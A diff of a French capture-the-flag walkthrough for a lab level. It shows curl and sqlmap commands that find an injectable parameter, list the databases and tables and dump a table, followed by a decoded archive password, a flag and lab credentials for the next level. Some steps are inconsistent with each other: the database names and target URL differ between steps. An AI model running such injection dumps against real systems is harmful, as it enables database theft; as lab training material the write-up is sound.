@@ -173,19 +173,53 @@ Auditer le fichier history des commandes bash pour trouver la séquence de port 
 Requeter le site web via curl afin de forger une commande sqlmap afin de s'injecter dans la base de données
 
 ```bash
-sqlmap -u "http://localhost/api/search.php?id=1" --batch
+# 1 - Curl initial pour analyser la requete et trouver le parametre vulnérable
+curl -i "http://10.100.7.4"
+
+
+sqlmap -u "http://10.100.7.4?search=test" --batch
 
 # 2. Lister les bases
-sqlmap -u "http://localhost/api/search.php?id=1" --dbs --batch
+sqlmap -u "http://10.100.7.4?search=test" --dbs --batch
 # Output: deepdive_db
 
-# 3. Lister les tables
-sqlmap -u "http://localhost/api/search.php?id=1" -D deepdive_db --tables --batch
+# 3. Lister les tables de la base recettes_db
+sqlmap -u "http://10.100.7.4?search=test" -D recettes_db --tables --batch
 # Output: users, credentials, system_access
 
-# 4. Dumper la table credentials
-sqlmap -u "http://localhost/api/search.php?id=1" -D deepdive_db -T credentials --dump --batch
+# 4. Dumper la table recettes de la base recettes_db
+sqlmap -u "http://localhost/api/search.php?id=1" -D recettes_db -T recettes --dump --batch
+
+# 5. Trouver le binaire caché dans les recettes
+
+"1010100 1101000 1100101 100000 1110000 1100001 1110011 1110011 1110111 1101111 1110010 1100100 100000 1111001 1101111
+ 1110101 100000 1101100 1101111 1101111 1101011 1101001 1101110 1100111 100000 1100110 1101111 1110010 100000 1101001
+ 1110011 100000 111010 100000 1111001 1010010 1110110 110111 1001100 1000010 1110100 1100101 110110 1110010 1000101
+ 110100 1111010 1111000 1101110 1011001"
+
+# Le convertir en texte clair pour trouver la passphrase de la clé ssh
+
+"The password you looking for is : yRv7LBte6rE4zxnY"
+
 ```
+**Décompression de l'archive:**
+```bash
+  unzip -P yRv7LBte6rE4zxnY secret.zip
+
+# Archive:  secret.zip
+# extracting: flag.txt
+# inflating: key_part.txt
+# extracting: next_level.txt
+```
+
+#### Infos à récupérer pour le niveau suivant:
+
+- Flag : FLAG{s0c14l_h4ck_c0mpl3t3}
+- contenu du fichier key_part.txt : 4bd651b5622efa943d75d5c0dc7d9292d565ad16d05afeebb320dd3f1f6a9c89
+- contenu du fichier next_level.txt :
+    - Host : 10.100.0.10
+    - User : huguette
+    - Pass : LQU8PvANkAuYitkQ
 
 ### Niveau 8: Fragment Hunt
 
